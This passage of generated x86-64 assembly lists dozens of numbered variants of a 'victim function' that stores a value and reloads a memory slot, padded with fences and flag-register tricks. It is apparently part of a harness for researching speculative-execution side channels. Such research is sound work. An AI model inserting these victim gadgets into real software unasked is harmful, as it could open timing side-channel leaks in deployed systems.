	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1221
.Lvictim_function_win0_var1221:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1222
.Lvictim_function_win0_var1222:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1223
.Lvictim_function_win0_var1223:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	nop
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1224
.Lvictim_function_win0_var1224:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1225
.Lvictim_function_win0_var1225:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1226
.Lvictim_function_win0_var1226:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1227
.Lvictim_function_win0_var1227:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1228
.Lvictim_function_win0_var1228:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1229
.Lvictim_function_win0_var1229:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1230
.Lvictim_function_win0_var1230:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1231
.Lvictim_function_win0_var1231:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1232
.Lvictim_function_win0_var1232:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1233
.Lvictim_function_win0_var1233:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1234
.Lvictim_function_win0_var1234:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1235
.Lvictim_function_win0_var1235:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1236
.Lvictim_function_win0_var1236:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1237
.Lvictim_function_win0_var1237:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1238
.Lvictim_function_win0_var1238:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1239
.Lvictim_function_win0_var1239:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1240
.Lvictim_function_win0_var1240:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1241
.Lvictim_function_win0_var1241:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1242
.Lvictim_function_win0_var1242:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1243
.Lvictim_function_win0_var1243:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1244
.Lvictim_function_win0_var1244:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1245
.Lvictim_function_win0_var1245:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1246
.Lvictim_function_win0_var1246:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1247
.Lvictim_function_win0_var1247:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1248
.Lvictim_function_win0_var1248:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1249
.Lvictim_function_win0_var1249:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1250
.Lvictim_function_win0_var1250:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1251
.Lvictim_function_win0_var1251:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1252
.Lvictim_function_win0_var1252:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1253
.Lvictim_function_win0_var1253:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1254
.Lvictim_function_win0_var1254:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1255
.Lvictim_function_win0_var1255:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1256
.Lvictim_function_win0_var1256:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1257
.Lvictim_function_win0_var1257:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1258
.Lvictim_function_win0_var1258:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1259
.Lvictim_function_win0_var1259:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1260
.Lvictim_function_win0_var1260:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1261
.Lvictim_function_win0_var1261:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1262
.Lvictim_function_win0_var1262:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1263
.Lvictim_function_win0_var1263:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1264
.Lvictim_function_win0_var1264:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1265
.Lvictim_function_win0_var1265:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1266
.Lvictim_function_win0_var1266:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1267
.Lvictim_function_win0_var1267:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1268
.Lvictim_function_win0_var1268:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1269
.Lvictim_function_win0_var1269:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1270
.Lvictim_function_win0_var1270:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1271
.Lvictim_function_win0_var1271:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1272
.Lvictim_function_win0_var1272:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1273
.Lvictim_function_win0_var1273:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1274
.Lvictim_function_win0_var1274:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1275
.Lvictim_function_win0_var1275:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1276
.Lvictim_function_win0_var1276:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1277
.Lvictim_function_win0_var1277:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1278
.Lvictim_function_win0_var1278:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1279
.Lvictim_function_win0_var1279:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1280
.Lvictim_function_win0_var1280:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1281
.Lvictim_function_win0_var1281:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1282
.Lvictim_function_win0_var1282:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1283
.Lvictim_function_win0_var1283:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1284
.Lvictim_function_win0_var1284:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1285
.Lvictim_function_win0_var1285:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1286
.Lvictim_function_win0_var1286:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1287
.Lvictim_function_win0_var1287:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1288
.Lvictim_function_win0_var1288:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1289
.Lvictim_function_win0_var1289:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1290
.Lvictim_function_win0_var1290:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1291
.Lvictim_function_win0_var1291:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1292
.Lvictim_function_win0_var1292:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1293
.Lvictim_function_win0_var1293:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1294
.Lvictim_function_win0_var1294:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1295
.Lvictim_function_win0_var1295:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1296
.Lvictim_function_win0_var1296:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1297
.Lvictim_function_win0_var1297:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1298
.Lvictim_function_win0_var1298:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1299
.Lvictim_function_win0_var1299:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1300
.Lvictim_function_win0_var1300:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1301
.Lvictim_function_win0_var1301:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1302
.Lvictim_function_win0_var1302:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1303
.Lvictim_function_win0_var1303:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1304
.Lvictim_function_win0_var1304:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1305
.Lvictim_function_win0_var1305:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1306
.Lvictim_function_win0_var1306:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1307
.Lvictim_function_win0_var1307:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1308
.Lvictim_function_win0_var1308:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1309
.Lvictim_function_win0_var1309:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1310
.Lvictim_function_win0_var1310:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1311
.Lvictim_function_win0_var1311:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1312
.Lvictim_function_win0_var1312:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1313
.Lvictim_function_win0_var1313:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1314
.Lvictim_function_win0_var1314:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1315
.Lvictim_function_win0_var1315:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
